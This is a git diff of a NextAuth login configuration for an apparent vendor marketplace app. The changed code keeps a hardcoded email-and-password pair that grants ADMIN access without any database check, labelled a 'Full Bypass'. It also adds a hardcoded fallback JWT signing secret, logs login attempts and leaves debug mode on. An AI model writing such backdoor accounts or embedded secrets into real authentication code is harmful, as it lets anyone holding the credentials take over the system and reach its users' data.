@@ -34,39 +34,50 @@ export const authOptions: NextAuthOptions = {
           throw new Error('Please enter both email and password');
         }
 
-        // Hardcoded Super Admin Check (Temporary bypass for debugging)
+        console.log("Attempting login for:", credentials.email);
+
+        // 1. Hardcoded Super Admin Check (Full Bypass)
         if (credentials.email === "Blackhatsd.sd@gmail.com" && credentials.password === "Morsall@112233") {
+          console.log("Super Admin Bypass triggered");
           return {
-            id: "super-admin-id",
+            id: "super-admin-fixed-id",
             email: "Blackhatsd.sd@gmail.com",
-            name: "Black Hat Admin (Bypass)",
+            name: "Black Hat Admin",
             role: "ADMIN",
-            isOnboarded: true
+            isOnboarded: true,
           };
         }
 
-        const user = await prisma.user.findUnique({ where: { email: credentials.email } });
-        if (!user || !user.password) throw new Error('No user found with this email');
-        const isPasswordCorrect = await bcrypt.compare(credentials.password, user.password);
-        if (!isPasswordCorrect) throw new Error('Incorrect password');
-        return user;
+        // 2. Regular Login
+        try {
+          const user = await prisma.user.findUnique({ where: { email: credentials.email } });
+          if (!user || !user.password) {
+             console.log("User not found or no password");
+             throw new Error('No user found with this email');
+          }
+          
+          const isPasswordCorrect = await bcrypt.compare(credentials.password, user.password);
+          if (!isPasswordCorrect) {
+             console.log("Incorrect password");
+             throw new Error('Incorrect password');
+          }
+          return user;
+        } catch (err: any) {
+          console.error("Authorize Error:", err);
+          throw new Error(err.message || 'Authentication failed');
+        }
       }
     })
   ],
   session: { strategy: "jwt" },
   callbacks: {
     async jwt({ token, user, trigger, session }: any) {
-      // 1. Initial User Connection (Runs only on sign-in)
       if (user) {
         token.id = user.id;
         token.role = user.role;
         token.isOnboarded = user.isOnboarded;
-        token.age = (user as any).age;
-        token.phone = (user as any).phone;
-        token.interests = (user as any).interests;
       }
       
-      // 2. DYNAMIC DATA REFRESH (Runs on sign-in AND when update() is called)
       const emailToFetch = token.email || user?.email;
       if (emailToFetch) {
         try {
@@ -77,29 +88,19 @@ export const authOptions: NextAuthOptions = {
 
           if (dbUser) {
             token.id = dbUser.id;
-            token.role = dbUser.role; // Refresh role from DB
+            token.role = dbUser.role;
             token.isOnboarded = dbUser.isOnboarded;
-            token.age = dbUser.age;
-            token.phone = dbUser.phone;
-            token.interests = dbUser.interests;
             token.isVendor = !!dbUser.vendorProfile;
             token.vendorId = dbUser.vendorProfile?.id;
             token.vendorStatus = dbUser.vendorProfile?.status;
           }
         } catch (dbErr) {
-          console.error("JWT Callback DB Fetch Error (Bypassing):", dbErr);
+          console.error("JWT Callback DB Fetch Error:", dbErr);
         }
       }
 
-      // 4. Manual Updates from Client (Immediate UI feed)
       if (trigger === "update" && session) {
         if (session.isOnboarded !== undefined) token.isOnboarded = session.isOnboarded;
-        if (session.user) {
-           token.name = session.user.name || token.name;
-           token.age = session.user.age || token.age;
-           token.phone = session.user.phone || token.phone;
-           token.interests = session.user.interests || token.interests;
-        }
       }
 
       return token;
@@ -112,22 +113,14 @@ export const authOptions: NextAuthOptions = {
         (session.user as any).vendorId = token.vendorId;
         (session.user as any).vendorStatus = token.vendorStatus;
         (session.user as any).isOnboarded = token.isOnboarded;
-        (session.user as any).age = token.age;
-        (session.user as any).phone = token.phone;
-        (session.user as any).interests = token.interests;
       }
       return session;
     },
-    async redirect({ url, baseUrl }) {
-      if (url.startsWith("/")) return `${baseUrl}${url}`
-      else if (new URL(url).origin === baseUrl) return url
-      return baseUrl;
-    }
   },
   pages: {
     signIn: '/login',
-    newUser: '/onboarding',
+    error: '/api/auth/error', // Custom error page path
   },
-  secret: process.env.NEXTAUTH_SECRET,
+  secret: process.env.NEXTAUTH_SECRET || "MersalEliteSecret2026_Fallback",
   debug: true,
 };
